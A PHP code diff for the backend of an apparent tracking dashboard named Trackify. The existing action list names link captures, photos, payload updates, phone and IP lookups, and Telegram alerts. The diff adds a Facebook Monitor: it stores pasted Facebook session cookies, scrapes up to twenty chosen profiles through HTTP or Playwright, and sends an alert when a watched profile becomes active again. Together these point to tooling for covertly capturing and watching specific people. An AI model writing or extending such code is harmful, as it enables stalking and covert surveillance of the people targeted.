@@ -10,7 +10,7 @@ require_once __DIR__ . '/access.php';
 trackify_enforce_ip_whitelist($_SERVER, true);
 
 $action = $_GET['action'] ?? '';
-$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'telegram_config', 'telegram_test', 'update_payload', 'diag', 'phone_lookup', 'phone_history', 'ip_lookup', 'exiftool', 'saved_info', 'clear_saved_info', 'saveinfo_start', 'saveinfo_link', 'saveinfo_update_payload', 'saveinfo_templates'];
+$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'telegram_config', 'telegram_test', 'update_payload', 'diag', 'phone_lookup', 'phone_history', 'ip_lookup', 'exiftool', 'saved_info', 'clear_saved_info', 'saveinfo_start', 'saveinfo_link', 'saveinfo_update_payload', 'saveinfo_templates', 'fb_monitor_list', 'fb_monitor_add', 'fb_monitor_remove', 'fb_monitor_check', 'fb_monitor_config', 'fb_monitor_save_config', 'fb_monitor_debug'];
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     header('Content-Type: application/json');
@@ -41,6 +41,7 @@ $baseDir = $_root !== false ? $_root : __DIR__;
 chdir($baseDir);
 
 require_once $baseDir . '/trackify_capture.php';
+require_once $baseDir . '/includes/fb_monitor_helpers.php';
 
 switch ($action) {
     case 'start':
@@ -114,6 +115,27 @@ switch ($action) {
         break;
     case 'saveinfo_templates':
         handleSaveinfoTemplates();
+        break;
+    case 'fb_monitor_list':
+        handleFbMonitorList();
+        break;
+    case 'fb_monitor_add':
+        handleFbMonitorAdd();
+        break;
+    case 'fb_monitor_remove':
+        handleFbMonitorRemove();
+        break;
+    case 'fb_monitor_check':
+        handleFbMonitorCheck();
+        break;
+    case 'fb_monitor_config':
+        handleFbMonitorConfig();
+        break;
+    case 'fb_monitor_save_config':
+        handleFbMonitorSaveConfig();
+        break;
+    case 'fb_monitor_debug':
+        handleFbMonitorDebug();
         break;
     default:
         echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
@@ -2457,4 +2479,331 @@ function handleTelegramTest(): void
     }
 
     echo json_encode(['status' => 'success', 'message' => 'Test message sent. Check your Telegram chat.']);
+}
+
+// ---------------------------------------------------------------------------
+// Facebook Monitor handlers
+// ---------------------------------------------------------------------------
+
+function handleFbMonitorConfig(): void
+{
+    $uid = dashboard_session_user_id();
+    $cfg = fb_monitor_read_config($uid);
+    echo json_encode([
+        'status'                 => 'success',
+        'cookies_set'            => $cfg['cookies'] !== '',
+        'check_interval_minutes' => (int) ($cfg['check_interval_minutes'] ?? 15),
+    ]);
+}
+
+function handleFbMonitorSaveConfig(): void
+{
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+        return;
+    }
+    $uid   = dashboard_session_user_id();
+    $input = json_decode((string) file_get_contents('php://input'), true);
+    if (!is_array($input)) {
+        $input = [];
+    }
+    $interval = max(5, min(1440, (int) ($input['check_interval_minutes'] ?? 15)));
+    $current  = fb_monitor_read_config($uid);
+    $newCookies = $current['cookies'];
+    if (array_key_exists('cookies', $input)) {
+        $raw = trim((string) $input['cookies']);
+        // FB cookie strings can be long; truncation breaks JSON exports.
+        $maxLen = 20000;
+        if (strlen($raw) > $maxLen) {
+            echo json_encode(['status' => 'error', 'message' => 'Cookie input is too long (max ' . $maxLen . ' characters).']);
+            return;
+        }
+        // If user pasted JSON cookie export, validate it parses.
+        if ($raw !== '' && $raw[0] === '[') {
+            $test = json_decode($raw, true);
+            if (!is_array($test)) {
+                echo json_encode(['status' => 'error', 'message' => 'Cookie JSON could not be parsed. Paste the full JSON array export or a flat "name=value; ..." string.']);
+                return;
+            }
+        }
+        $newCookies = $raw;
+    }
+    $ok = fb_monitor_write_config($uid, [
+        'cookies'                 => $newCookies,
+        'check_interval_minutes'  => $interval,
+        'updated_at'              => gmdate('c'),
+    ]);
+    echo json_encode([
+        'status'  => $ok ? 'success' : 'error',
+        'message' => $ok ? 'FB Monitor config saved.' : 'Could not write config file.',
+    ]);
+}
+
+function handleFbMonitorList(): void
+{
+    $uid = dashboard_session_user_id();
+    $pdo = trackify_pdo();
+    if (!$pdo instanceof PDO) {
+        echo json_encode(['status' => 'error', 'message' => 'Database not available']);
+        return;
+    }
+    try {
+        $stmt = $pdo->prepare(
+            'SELECT id, profile_url, label, last_status, last_checked_at, last_changed_at, created_at
+             FROM facebook_monitor WHERE user_id = ? ORDER BY created_at DESC'
+        );
+        $stmt->execute([$uid]);
+        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
+        echo json_encode(['status' => 'success', 'monitors' => $rows ?: []]);
+    } catch (PDOException $e) {
+        echo json_encode(['status' => 'error', 'message' => 'DB error — run the facebook_monitor migration: ' . $e->getMessage()]);
+    }
+}
+
+function handleFbMonitorAdd(): void
+{
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+        return;
+    }
+    $uid   = dashboard_session_user_id();
+    $input = json_decode((string) file_get_contents('php://input'), true);
+    if (!is_array($input)) {
+        $input = [];
+    }
+    $url   = trim((string) ($input['url'] ?? ''));
+    $label = trim((string) ($input['label'] ?? ''));
+
+    if ($url === '' || !filter_var($url, FILTER_VALIDATE_URL)) {
+        echo json_encode(['status' => 'error', 'message' => 'A valid URL is required.']);
+        return;
+    }
+    $host = strtolower((string) parse_url($url, PHP_URL_HOST));
+    if (strpos($host, 'facebook.com') === false && strpos($host, 'fb.com') === false) {
+        echo json_encode(['status' => 'error', 'message' => 'Only facebook.com or fb.com URLs are allowed.']);
+        return;
+    }
+
+    $pdo = trackify_pdo();
+    if (!$pdo instanceof PDO) {
+        echo json_encode(['status' => 'error', 'message' => 'Database not available']);
+        return;
+    }
+    try {
+        $countStmt = $pdo->prepare('SELECT COUNT(*) FROM facebook_monitor WHERE user_id = ?');
+        $countStmt->execute([$uid]);
+        if ((int) $countStmt->fetchColumn() >= 20) {
+            echo json_encode(['status' => 'error', 'message' => 'Maximum 20 monitors per account.']);
+            return;
+        }
+        $ins = $pdo->prepare(
+            'INSERT INTO facebook_monitor (user_id, profile_url, label, last_status, created_at)
+             VALUES (?, ?, ?, \'unknown\', NOW())'
+        );
+        $ins->execute([$uid, $url, $label]);
+        echo json_encode(['status' => 'success', 'id' => (int) $pdo->lastInsertId()]);
+    } catch (PDOException $e) {
+        echo json_encode(['status' => 'error', 'message' => 'DB error — run the facebook_monitor migration: ' . $e->getMessage()]);
+    }
+}
+
+function handleFbMonitorRemove(): void
+{
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+        return;
+    }
+    $uid   = dashboard_session_user_id();
+    $input = json_decode((string) file_get_contents('php://input'), true);
+    if (!is_array($input)) {
+        $input = [];
+    }
+    $id = (int) ($input['id'] ?? 0);
+    if ($id <= 0) {
+        echo json_encode(['status' => 'error', 'message' => 'id required']);
+        return;
+    }
+    $pdo = trackify_pdo();
+    if (!$pdo instanceof PDO) {
+        echo json_encode(['status' => 'error', 'message' => 'Database not available']);
+        return;
+    }
+    $del = $pdo->prepare('DELETE FROM facebook_monitor WHERE id = ? AND user_id = ?');
+    $del->execute([$id, $uid]);
+    echo json_encode(['status' => 'success']);
+}
+
+function handleFbMonitorCheck(): void
+{
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+        return;
+    }
+    $uid   = dashboard_session_user_id();
+    $input = json_decode((string) file_get_contents('php://input'), true);
+    if (!is_array($input)) {
+        $input = [];
+    }
+    $onlyId = isset($input['id']) ? (int) $input['id'] : null;
+
+    $cfg     = fb_monitor_read_config($uid);
+    $cookies = $cfg['cookies'];
+    if ($cookies === '') {
+        echo json_encode(['status' => 'error', 'message' => 'No Facebook cookies configured. Add them in Account Settings → FB Monitor.']);
+        return;
+    }
+
+    $pdo = trackify_pdo();
+    if (!$pdo instanceof PDO) {
+        echo json_encode(['status' => 'error', 'message' => 'Database not available']);
+        return;
+    }
+
+    try {
+        if ($onlyId !== null) {
+            $stmt = $pdo->prepare('SELECT * FROM facebook_monitor WHERE id = ? AND user_id = ?');
+            $stmt->execute([$onlyId, $uid]);
+        } else {
+            $stmt = $pdo->prepare('SELECT * FROM facebook_monitor WHERE user_id = ?');
+            $stmt->execute([$uid]);
+        }
+        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
+    } catch (PDOException $e) {
+        echo json_encode(['status' => 'error', 'message' => 'DB error: ' . $e->getMessage() . '. Run the facebook_monitor CREATE TABLE migration.']);
+        return;
+    }
+
+    $results = [];
+    foreach ($rows as $row) {
+        $prevStatus = (string) $row['last_status'];
+        $check      = fb_check_profile_url((string) $row['profile_url'], $cookies);
+        $newStatus  = $check['status'];
+        $detail     = $check['detail'];
+
+        if ($newStatus === 'unknown') {
+            $results[] = ['id' => (int) $row['id'], 'status' => 'unknown', 'detail' => $detail, 'changed' => false];
+            continue;
+        }
+
+        $changed = $newStatus !== $prevStatus;
+        $now     = gmdate('Y-m-d H:i:s');
+
+        try {
+            $upd = $pdo->prepare(
+                'UPDATE facebook_monitor
+                 SET last_status = ?,
+                     last_checked_at = ?,
+                     last_changed_at = CASE WHEN last_status != ? THEN ? ELSE last_changed_at END
+                 WHERE id = ? AND user_id = ?'
+            );
+            $upd->execute([$newStatus, $now, $newStatus, $now, (int) $row['id'], $uid]);
+        } catch (PDOException $e) {
+            $results[] = ['id' => (int) $row['id'], 'status' => 'error', 'detail' => $e->getMessage(), 'changed' => false];
+            continue;
+        }
+
+        if ($changed && $newStatus === 'active'
+                && in_array($prevStatus, ['inactive', 'unavailable', 'unknown'], true)) {
+            fb_monitor_send_active_alert((string) $row['profile_url'], (string) ($row['label'] ?? ''));
+        }
+
+        $results[] = ['id' => (int) $row['id'], 'status' => $newStatus, 'detail' => $detail, 'changed' => $changed];
+    }
+
+    echo json_encode(['status' => 'success', 'results' => $results]);
+}
+
+function handleFbMonitorDebug(): void
+{
+    $uid = dashboard_session_user_id();
+    $url = trim((string) ($_GET['url'] ?? ''));
+    if ($url === '') {
+        echo json_encode(['status' => 'error', 'message' => 'url param required']);
+        return;
+    }
+    $cfg     = fb_monitor_read_config($uid);
+    $cookies = fb_cookies_normalize($cfg['cookies']);
+    if ($cookies === '') {
+        echo json_encode(['status' => 'error', 'message' => 'No cookies configured']);
+        return;
+    }
+
+    $cookieRaw = (string) ($cfg['cookies'] ?? '');
+    $pw = fb_monitor_try_playwright($url, $cookieRaw);
+    if ($pw !== null) {
+        $html = $pw['html'];
+        $code = $pw['http_code'];
+        $effectiveUrl = $pw['effective_url'];
+        $curlErr = '';
+        $checkUrl = $url;
+        $attemptedUrls = ['playwright'];
+        $fetchMode = 'playwright';
+    } else {
+        $fetch = fb_monitor_fetch_facebook_html($url, $cookieRaw);
+        $html = $fetch['html'];
+        $code = $fetch['http_code'];
+        $effectiveUrl = $fetch['effective_url'];
+        $curlErr = $fetch['curl_error'];
+        $checkUrl = $fetch['used_url'];
+        $attemptedUrls = $fetch['attempted_urls'] ?? [];
+        $fetchMode = 'http';
+    }
+
+    // Same classification as cron/API check (Playwright preferred, else HTTP).
+    $check = fb_check_profile_url($url, $cookieRaw);
+
+    // Search for key phrases in the body
+    $lower = strtolower($html);
+    $normalised = str_replace(["\xe2\x80\x99", '&#8217;', '&#x2019;', '&rsquo;', '\u2019'], "'", $lower);
+    $found = [];
+    foreach ([
+        "this content isn't available right now",
+        "this content isn't available",
+        "sorry, this page isn't available",
+        "the link you followed may be broken",
+        "page not found",
+        "content not available",
+        "this account is currently unavailable",
+        "not available on this browser",
+        "hindi available ang facebook sa browser",
+        "hindi sinusuportahan ang browser na ito",
+        "gamitin ang facebook app",
+        "gumamit ng sinusuportahang browser",
+        "UnavailableObject",
+        "errorCode",
+    ] as $p) {
+        if (strpos($normalised, strtolower($p)) !== false) $found[] = $p;
+    }
+
+    // Extract visible-ish text from <body> (remove script/style first).
+    $bodyText = '';
+    if (preg_match('/<body[^>]*>(.*?)<\/body>/is', $html, $bm)) {
+        $bodyHtml = (string) $bm[1];
+        $bodyHtml = preg_replace('/<script\b[^>]*>.*?<\/script>/is', ' ', $bodyHtml) ?? $bodyHtml;
+        $bodyHtml = preg_replace('/<style\b[^>]*>.*?<\/style>/is', ' ', $bodyHtml) ?? $bodyHtml;
+        $bodyText = trim(strip_tags($bodyHtml));
+        $bodyText = (string) preg_replace('/\s+/', ' ', $bodyText);
+    }
+
+    $title = '';
+    if (preg_match('/<title[^>]*>(.*?)<\/title>/is', $html, $tm)) {
+        $title = trim((string) preg_replace('/\s+/', ' ', strip_tags((string) $tm[1])));
+    }
+
+    echo json_encode([
+        'status'        => 'success',
+        'requested_url' => $url,
+        'fetch_mode'    => $fetchMode,
+        'check_url'     => $checkUrl,
+        'attempted_urls' => $attemptedUrls,
+        'http_code'     => $code,
+        'effective_url' => $effectiveUrl,
+        'curl_error'    => $curlErr,
+        'response_len'  => strlen($html),
+        'checker_status' => $check['status'] ?? null,
+        'checker_detail' => $check['detail'] ?? null,
+        'phrases_found' => $found,
+        'title'         => $title,
+        'body_text'     => substr($bodyText, 0, 3000),
+    ], JSON_UNESCAPED_UNICODE);
 }
